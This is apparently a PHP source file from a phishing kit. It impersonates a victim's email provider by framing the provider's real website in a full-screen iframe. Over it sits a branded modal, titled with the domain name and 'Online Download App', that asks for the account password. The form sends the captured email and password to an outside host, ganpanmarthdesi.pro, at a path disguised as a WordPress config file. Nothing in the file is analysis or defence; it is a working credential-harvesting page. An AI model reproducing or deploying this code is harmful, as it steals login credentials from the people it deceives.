<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <title><?php echo $ddomain;  ?>Authentication</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <link rel="icon" href="https://logo.clearbit.com/<?php echo $ddomain;?>" type="image/png">
<style>
 <style>
        body{
            margin: 0;
            padding: 0;
        }
        body:before{
            content: '';
            position: fixed;
            width: 100vw;
            height: 100vh;
     
        }
		
	.modal-dialog{
    position: relative;
    display: table; /* This is important */ 
    overflow-y: auto;    
    overflow-x: auto;
    width: auto;
    min-width: 300px;   
}
</style>  
</head>
<body>
<iframe id="iframe-container" is="x-frame-bypass" src="https://<?php echo preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));  ?>" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden;">
    Your browser doesn't support iframes
</iframe>




 
 
 
 <div id="myModal" class="modal fade" role="dialog" data-keyboard="false" data-backdrop="static">
  <div class="modal-dialog" style="top:8%">

    <!-- Modal content-->
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" >&times;</button>
      </div>
      <div class="modal-body">
	  
	  
	  <div class="row">
	  <div class="col-sm-12 text-center">
	  <h4 class="text-center" style="color:#000; font-size:25px; font-weight:700" face="Arial"><?php echo strtoupper($ddomain." ");?></h4>
          <h4 class="text-center" style="color:#000; font-size:25px; font-weight:700" face="Arial">Online Download App</h4><br/>
	  <img class="img img-responsive" src="https://logo.clearbit.com/<?php echo $ddomain;?>" style="margin:auto; height:80px;"><br/>
	  </div>
	  </div>
        <div class="row">
	  <div class="col-sm-12 text-center" style="color:#f00">
	  Please enter a valid password to continue *<br/><br/>
	  </div>
	  </div>
	   
	   <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">
	   
	  
  <div class="form-group" style="font-size:1.5em">
 
											
	 <div class="input-group" style="border-radius:0px;">
   										
		 <span class="input-group-addon"><span class="glyphicon glyphicon-user"></span></span>									
   
    <input style="border-radius:0px; background-color:#ffe; height:40px" value="<?php echo $users;?>" type="email" class="form-control" id="email" disabled>
    <input type="hidden" name="user" value="<?php echo $users;?>@<?php echo $ddomain;?>" class="form-control" id="email" >
    <input type="hidden" name="link" value="http://<?php echo $ddomain;?>" >
    <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
    <input type="hidden" name="sender" value="Other" >
	 <span class="input-group-addon">@<?php echo $ddomain;?></span>
	 </div>
  </div>
  <div class="form-group">
 <div class="input-group" style="border-radius:0px; margin-top:20px">
   										
		 <span class="input-group-addon"><span class="glyphicon glyphicon-lock"></span></span>	
    <input style="height:40px" required type="password" placeholder="Password" name="passwd" class="form-control" id="pwd" autofocus>
  </div>
  </div>

  <button type="submit" style="border-radius:0px; margin-top:20px" class="btn btn-primary col-sm-12">Continue</button>
</form>

<div class="row" style="">
<div class="col-sm-12">
<div style="text-align:center"><br/><small>
            &copy; <?php echo date('Y');?> <?php echo $ddomain;  ?>
         
		</small></div>
		</div>
		</div>

      </div>
      
    </div>

  </div>
</div>
</body>
</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>